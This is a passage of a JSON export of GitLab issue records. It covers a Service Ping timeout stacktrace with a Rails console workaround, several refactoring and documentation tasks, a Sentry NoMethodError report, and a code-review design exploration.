--\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eRack::Timeout::RequestTimeoutException stacktrace\u003c/summary\u003e\n\u003cpre\u003e\n\n```\nRack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms):\n\nlib/gitlab/database/batch_count.rb:95:in `count'\nlib/gitlab/database/batch_count.rb:29:in `batch_count'\nlib/gitlab/utils/usage_data.rb:48:in `count'\nlib/gitlab/usage_data.rb:95:in `system_usage_data'\nee/lib/ee/gitlab/usage_data.rb:190:in `system_usage_data'\nlib/gitlab/usage_data.rb:50:in `block in uncached_data'\nlib/gitlab/utils/usage_data.rb:123:in `with_finished_at'\nlib/gitlab/usage_data.rb:46:in `uncached_data'\nee/lib/ee/gitlab/usage_data.rb:64:in `block in uncached_data'\nlib/gitlab/utils/usage_data.rb:123:in `with_finished_at'\nee/lib/ee/gitlab/usage_data.rb:63:in `uncached_data'\nlib/gitlab/usage_data.rb:39:in `block in data'\nlib/gitlab/usage_data.rb:38:in `data'\napp/controllers/admin/application_settings_controller.rb:66:in `block (2 levels) in usage_data'\napp/controllers/admin/application_settings_controller.rb:64:in `usage_data'\nee/lib/gitlab/ip_address_state.rb:10:in `with'\nee/app/controllers/ee/application_controller.rb:44:in `set_current_ip_address'\napp/controllers/application_controller.rb:482:in `set_current_admin'\nlib/gitlab/session.rb:11:in `with_session'\napp/controllers/application_controller.rb:473:in `set_session_storage'\nlib/gitlab/i18n.rb:73:in `with_locale'\nlib/gitlab/i18n.rb:79:in `with_user_locale'\napp/controllers/application_controller.rb:467:in `set_locale'\nlib/gitlab/error_tracking.rb:52:in `with_context'\napp/controllers/application_controller.rb:532:in `sentry_context'\napp/controllers/application_controller.rb:460:in `block in set_current_context'\nlib/gitlab/application_context.rb:56:in `block in use'\nlib/gitlab/application_context.rb:56:in `use'\nlib/gitlab/application_context.rb:22:in `with_context'\napp/controllers/application_controller.rb:451:in `set_current_context'\nlib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call'\nlib/gitlab/middleware/rails_queue_duration.rb:33:in `call'\nlib/gitlab/metrics/rack_middleware.rb:16:in `block in call'\nlib/gitlab/metrics/transaction.rb:56:in `run'\nlib/gitlab/metrics/rack_middleware.rb:16:in `call'\nlib/gitlab/request_profiler/middleware.rb:17:in `call'\nlib/gitlab/jira/middleware.rb:19:in `call'\nlib/gitlab/middleware/go.rb:20:in `call'\nlib/gitlab/etag_caching/middleware.rb:21:in `call'\nlib/gitlab/middleware/multipart.rb:172:in `call'\nlib/gitlab/middleware/read_only/controller.rb:50:in `call'\nlib/gitlab/middleware/read_only.rb:18:in `call'\nlib/gitlab/middleware/same_site_cookies.rb:27:in `call'\nlib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'\nlib/gitlab/middleware/basic_health_check.rb:25:in `call'\nlib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'\nlib/gitlab/middleware/request_context.rb:21:in `call'\nconfig/initializers/fix_local_cache_middleware.rb:11:in `call'\nlib/gitlab/metrics/requests_rack_middleware.rb:76:in `call'\nlib/gitlab/middleware/release_env.rb:12:in `call'\nack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms):\n\nlib/gitlab/database/batch_count.rb:95:in `count'\nlib/gitlab/database/batch_count.rb:29:in `batch_count'\nlib/gitlab/utils/usage_data.rb:48:in `count'\nlib/gitlab/usage_data.rb:95:in `system_usage_data'\nee/lib/ee/gitlab/usage_data.rb:190:in `system_usage_data'\nlib/gitlab/usage_data.rb:50:in `block in uncached_data'\nlib/gitlab/utils/usage_data.rb:123:in `with_finished_at'\nlib/gitlab/usage_data.rb:46:in `uncached_data'\nee/lib/ee/gitlab/usage_data.rb:64:in `block in uncached_data'\nlib/gitlab/utils/usage_data.rb:123:in `with_finished_at'\nee/lib/ee/gitlab/usage_data.rb:63:in `uncached_data'\nlib/gitlab/usage_data.rb:39:in `block in data'\nlib/gitlab/usage_data.rb:38:in `data'\napp/controllers/admin/application_settings_controller.rb:66:in `block (2 levels) in usage_data'\napp/controllers/admin/application_settings_controller.rb:64:in `usage_data'\nee/lib/gitlab/ip_address_state.rb:10:in `with'\nee/app/controllers/ee/application_controller.rb:44:in `set_current_ip_address'\napp/controllers/application_controller.rb:482:in `set_current_admin'\nlib/gitlab/session.rb:11:in `with_session'\napp/controllers/application_controller.rb:473:in `set_session_storage'\nlib/gitlab/i18n.rb:73:in `with_locale'\nlib/gitlab/i18n.rb:79:in `with_user_locale'\napp/controllers/application_controller.rb:467:in `set_locale'\nlib/gitlab/error_tracking.rb:52:in `with_context'\napp/controllers/application_controller.rb:532:in `sentry_context'\napp/controllers/application_controller.rb:460:in `block in set_current_context'\nlib/gitlab/application_context.rb:56:in `block in use'\nlib/gitlab/application_context.rb:56:in `use'\nlib/gitlab/application_context.rb:22:in `with_context'\n```\n\u003c/details\u003e\n\n[console_output.txt](/uploads/963072697ed57798f265f735a7fe466f/console_output.txt)\n\n#### Results of GitLab environment info\n\nReported on GitLab Versions 13.9 and 13.11.\n\n### Possible fixes\n\nRunning the equivalent request via Rails circumvents the timeout issue and allows the ping to be generated, if the command is allowed to run for sufficient time:\n\n```\n# Start a rails console session\nsudo gitlab-rails console\n\n# Enable debug logging\nRails.logger.level = Logger::DEBUG\n\n# Generate the cached usage ping\nGitlab::UsageData.to_json\n\n# Generate a fresh new usage ping\nGitlab::UsageData.to_json(force_refresh: true)\n```\n\nOne possibility is that the query mentioned above is not using an index to execute.","state":"closed","created_at":"2022-03-02T15:10:22.136Z","updated_at":"2022-05-26T07:27:34.432Z","closed_at":"2022-05-26T07:27:34.417Z","closed_by":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"labels":["Category:Service Ping","backend","customer","devops::growth","group::product intelligence","missed-SLO","missed:14.10","missed:15.0","priority::2","section::growth","severity::2","type::bug","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"}],"author":{"id":8012210,"username":"dnldnz","name":"Daniel Diniz","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8012210/avatar.png","web_url":"https://gitlab.com/dnldnz"},"type":"ISSUE","assignee":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikołaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"user_notes_count":35,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354139","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354139","notes":"https://gitlab.com/api/v4/projects/278964/issues/354139/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354139/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354139","relative":"#354139","full":"gitlab-org/gitlab#354139"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103966480,"iid":354108,"project_id":278964,"title":"Investigate and remove closest_gitlab_subscription","description":"The following discussion from !81432 should be addressed:\n\n- [ ] @a_akgun started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81432#note_858514876):  (+2 comments)\n\n    \u003e @dstull Unrelated discussion: I wonder why we check `parent_id` here. As far as I see `root_ancestor.gitlab_subscription` would work because `root_ancestor` returns self.","state":"closed","created_at":"2022-03-02T13:52:10.053Z","updated_at":"2022-03-16T20:43:24.066Z","closed_at":"2022-03-15T17:52:46.631Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","devops::growth","group::acquisition","maintenance::refactor","section::growth","type::maintenance","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354108","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354108","notes":"https://gitlab.com/api/v4/projects/278964/issues/354108/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354108/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354108","relative":"#354108","full":"gitlab-org/gitlab#354108"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103966322,"iid":354107,"project_id":278964,"title":"Documentation: Add experimentation circuit breaker","description":"The following discussion from !81834 should be addressed:\n\n- [ ] @reprazent started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/81834#note_859809412):  (+1 comment)\n\n    \u003e Thanks @dstull. Not blocking, but is this documented somewhere and should we spread that around? We need to make sure that enough people know about this, so we know it is an option when we see the need.","state":"closed","created_at":"2022-03-02T13:48:42.385Z","updated_at":"2022-03-11T13:25:44.288Z","closed_at":"2022-03-11T13:25:44.239Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","devops::growth","group::acquisition","section::growth","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":2,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354107","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354107","notes":"https://gitlab.com/api/v4/projects/278964/issues/354107/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354107/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354107","relative":"#354107","full":"gitlab-org/gitlab#354107"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103951378,"iid":354086,"project_id":278964,"title":"Backend: Gather data on whether unplayable jobs are often retried","description":"# Context\n\n`PlayBuildService` currently retries a job if the job is not playable. This is legacy functionality that we want to remove, but first we must understand how often this happens.\n\n# Proposed solution\n\nAdd logging in the branch that retries unplayable jobs so we can count how often that code is used.","state":"closed","created_at":"2022-03-02T10:40:17.123Z","updated_at":"2022-03-30T11:40:24.227Z","closed_at":"2022-03-30T11:40:24.206Z","closed_by":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"labels":["Category:Pipeline Authoring","backend","devops::verify","group::pipeline authoring","section::ops","type::maintenance","workflow::ready for development"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"}],"author":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"type":"ISSUE","assignee":{"id":4059128,"username":"avielle","name":"Avielle Wolfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4059128/avatar.png","web_url":"https://gitlab.com/avielle"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354086","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354086","notes":"https://gitlab.com/api/v4/projects/278964/issues/354086/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354086/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354086","relative":"#354086","full":"gitlab-org/gitlab#354086"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103935838,"iid":354077,"project_id":278964,"title":"Document iteration references","description":"While iteration quick action is documented in https://docs.gitlab.com/ee/user/project/quick_actions.html#gitlab-quick-actions, the corresponding markdown reference scheme isn't documented in https://docs.gitlab.com/ee/user/markdown#gitlab-specific-references.","state":"closed","created_at":"2022-03-02T06:58:09.320Z","updated_at":"2022-04-25T18:43:44.285Z","closed_at":"2022-04-08T02:04:43.619Z","closed_by":{"id":5961404,"username":"euko","name":"Eulyeon Ko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5961404/avatar.png","web_url":"https://gitlab.com/euko"},"labels":["devops::plan","docs-only","documentation","group::project management","missed:14.9","section::dev","workflow::production"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":5961404,"username":"euko","name":"Eulyeon Ko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5961404/avatar.png","web_url":"https://gitlab.com/euko"}],"author":{"id":5961404,"username":"euko","name":"Eulyeon Ko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5961404/avatar.png","web_url":"https://gitlab.com/euko"},"type":"ISSUE","assignee":{"id":5961404,"username":"euko","name":"Eulyeon Ko","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5961404/avatar.png","web_url":"https://gitlab.com/euko"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354077","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354077","notes":"https://gitlab.com/api/v4/projects/278964/issues/354077/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354077/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354077","relative":"#354077","full":"gitlab-org/gitlab#354077"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7567,"epic":{"id":444020,"iid":7567,"title":"Iteration Cadence GA tasks","url":"/groups/gitlab-org/-/epics/7567","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":103921160,"iid":354058,"project_id":278964,"title":"NoMethodError: undefined method `build_canonical_path' for #\u003cGroups::Analytics::RepositoryAnalyticsController:0x...","description":"https://sentry.gitlab.net/gitlab/gitlabcom/issues/3211082/?referrer=gitlab_plugin\n\n```\nNoMethodError: undefined method `build_canonical_path' for #\u003cGroups::Analytics::RepositoryAnalyticsController:0x00007f710ea46880\u003e\n  app/controllers/concerns/routable_actions.rb:54:in `ensure_canonical_path'\n    redirect_to build_canonical_path(routable), status: :moved_permanently\n  app/controllers/concerns/routable_actions.rb:9:in `find_routable!'\n    ensure_canonical_path(routable, routable_full_path)\n  app/controllers/application_controller.rb:499:in `set_current_admin'\n    return yield unless Gitlab::CurrentSettings.admin_mode\n  lib/gitlab/session.rb:11:in `with_session'\n    yield\n  app/controllers/application_controller.rb:490:in `set_session_storage'\n    Gitlab::Session.with_session(session, \u0026block)\n...\n(151 additional frame(s) were not displayed)\n```","state":"closed","created_at":"2022-03-01T22:21:06.849Z","updated_at":"2022-03-03T15:38:48.261Z","closed_at":"2022-03-03T15:38:48.230Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["Category:Planning Analytics","backend","devops::manage","group::optimize","priority::3","section::dev","type::bug","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":402401,"username":"jobbot","name":"Bot","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aaa6738f1ebf25404010884af511b0e7?s=80\u0026d=identicon","web_url":"https://gitlab.com/jobbot"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354058","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354058","notes":"https://gitlab.com/api/v4/projects/278964/issues/354058/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354058/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354058","relative":"#354058","full":"gitlab-org/gitlab#354058"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103920297,"iid":354056,"project_id":278964,"title":"Filter pipelines by updated_at","description":"We currently offer the ability to filter pipelines by `updated_at` [in REST](https://gitlab.com/gitlab-org/gitlab/-/blob/d3afdb504da24964acb3cb70730b35deb5473711/lib/api/ci/pipelines.rb#L46), but not in GraphQL.\n\nOur backend supports these fields :point_right: https://gitlab.com/gitlab-org/gitlab/-/blob/d3afdb504da24964acb3cb70730b35deb5473711/app/finders/ci/pipelines_finder.rb#L148\n\nWe should offer the same in GraphQL.","state":"closed","created_at":"2022-03-01T21:57:25.386Z","updated_at":"2022-03-08T19:41:24.572Z","closed_at":"2022-03-08T05:59:10.152Z","closed_by":{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"},"labels":["Category:Continuous Integration","GraphQL","api","auto updated","devops::verify","feature::enhancement","group::pipeline execution","section::ops","type::feature","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"}],"author":{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"},"type":"ISSUE","assignee":{"id":3717078,"username":"cablett","name":"charlie ablett","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3717078/avatar.png","web_url":"https://gitlab.com/cablett"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/354056","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/354056","notes":"https://gitlab.com/api/v4/projects/278964/issues/354056/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/354056/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#354056","relative":"#354056","full":"gitlab-org/gitlab#354056"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":103919857,"iid":354055,"project_id":278964,"title":"Review rounds: Initial design exploration","description":"#### Issue\n\nFollowing up from https://gitlab.com/gitlab-org/ux-research/-/issues/1769+, one of the main concerns participants had was the fact that the comment would be posted as a standalone comment, rather than as a threaded response to the original review request comment.\n\n#### Proposal\n\nFollowing implementation of https://gitlab.com/gitlab-org/gitlab/-/issues/350394+ Brainstorm how we can make the entire review more of a structured, end-to-end process.\n\n\u003cdetails\u003e\n\u003csummary\u003eBraindump\u003c/summary\u003e\n\n\n- User selects reviewer and has ability to add a comment\n- System note and review request comment are posted together as a single object\n- Reviewer submits review\n- Code comments, summary comment, and system note are posted together on that original object/thread (maybe code comments are collapsed :thinking:)\n- Add all pending comments to overview tab (with links to the actual comments on whichever commit) to give complete picture of review\n- Add additional options when submitting review\n  - We are already adding `Approve` and `Comment`; how can we convey \"disapprove\" in a kind and actionable way?\n\n\u003c/details\u003e\n\n\n## Version 1: basic designs of one potential flow\n\n\u003cdetails\u003e\n\n\nAuthor: \nClick request review\nAssign reviewers for each role (frontend, backend, UX)\n3 reviewers are assigned\n3 new activity entries are added\nEach reviewer gets MR added to “Review requests for you”\n\n\nReviewer 1:\nBanner at top of MR (`@author` has asked you to review the frontend (link to activity entry)\nReviewer can click `Start review` from banner, activity entry, or comment (current way)\nWhen review is completed, it is added to activity entry (can collapse entire review)\nReview can either approve, request changes, submit review without either\n\nApproved -\u003e \n- check mark appears next to reviewer in sidebar\n- MR removed from “Review requests for you”\n- Todo/notification generated for author\n\nRequest changes -\u003e\n- Banner appears for author saying `@user` requested changes (link to activity entry)\n- Icon appears next to reviewer in sidebar\n- Can re-request review in activity entry or sidebar\n- MR removed from “Review requests for you”\n- Todo/notification generated for author\n\nJust review (no approval or required changes; maybe just comments or questions)\n- Banner appears for author saying `@user` requested changes (link to activity entry)\n- Icon next to reviewer in sidebar\n- Can re-request review in activity entry or sidebar\n- MR removed from “Review requests for you”\n- Todo/notification generated for author\n\n\u003c/details\u003e\n\n- [Figma](https://www.figma.com/file/21pQk9lrftkO1Bg4Y7QOxO/Review-rounds?node-id=34%3A1105)\n- [Video walkthrough](https://youtu.be/L41F4JNlw7o)\n\n## Version 2: Utilize code owners and approval rules, add MR statuses, filters, and batch reviewer selection\n\n- [Figma](https://www.figma.com/file/21pQk9lrftkO1Bg4Y7QOxO/Review-rounds?node-id=55%3A1011)\n- [Video walkthrough](https://youtu.be/9vV6M7O7xWU)\n\n## Version 3: Top nav counter and MR list\n\n- [Figma](https://www.figma.com/file/21pQk9lrftkO1Bg4Y7QOxO/Review-rounds?node-id=105%3A1677)\n- [Video walkthrough](https://youtu.be/_mc9eGQy37U)\n\n## Version 4: \"My merge requests\" list, conventional comments, de-duplicating codeowner approvers, quick actions, non-required approvals\n\n\u003cdetails\u003e\nThe next design should tackle:\n\n- Status piece is tricky and needs more re-work\n- Incorporate quick actions\n- Conventional comments / defect classification (blocking vs non-blocking) — could function as “request changes”\n- How to display rule that triggered reviewer type?\n- Re-request review after approval given\n- Add global actions approve/review/submit review\n- How can we incorporate this in a more flexible way (show options even when code owners aren’t required, make sure it works for the way gitlab works)\n- Make sure “MRs that require my attention” aren’t too alert-y\n- Check flow for smaller MRs (for example when a team only has all frontend MRs or all backend MRs)\n- When users meet criteria for multiple codeowner/approval rules\n- Separate \"MRs I've authored\" from \"MRs I've been requested to review\" from the \"attention requested\" section of the MR page\n\nI'm going to remove the following items entirely:\n- Filtering (based on discipline, review type, activity type, etc) \n  - This is something we're exploring more in https://gitlab.com/gitlab-org/gitlab/-/issues/365334+\n- Notifications and todos \n  - These have their own problems and I don't want to go down a rabbit hole trying to solve them with review rounds (more on notifications work [here](https://gitlab.com/gitlab-org/gitlab-design/-/issues/2066))\n  - For now, we'll likely go with default behavior- maybe you'll receive a todo/notification based if you've been requested to review an MR or if a review has been submitted on your MR. More on that later\n\n\u003c/details\u003e\n\n- [Figma](https://www.figma.com/file/21pQk9lrftkO1Bg4Y7QOxO/Review-rounds?node-id=164%3A2523)\n- [Video walkthrough](https://youtu.be/75FEUU5TIok)","state":"closed","created_at":"2022-03-01T21:43:45.715Z","updated_at":"2023-01-12T18:44:48.777Z","closed_at":"2023-01-05T17:06:10.484Z","closed_by":{"id":201566,"username":"annabeldunstone","name":"Annabel Dunstone Gray","state":"active","avatar_url":"https://secure.gravatar.com/avatar/85c0203926134720f9a9aa8c6e264c78?s=80\u0026d=identicon","web_url":"https://gitlab.com/annabeldunstone"},"labels":["Category:Code Review Workflow","UX","devops::create","feature::enhancement","group::code review","missed:15.6","section::dev","type::feature","workflow::design"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 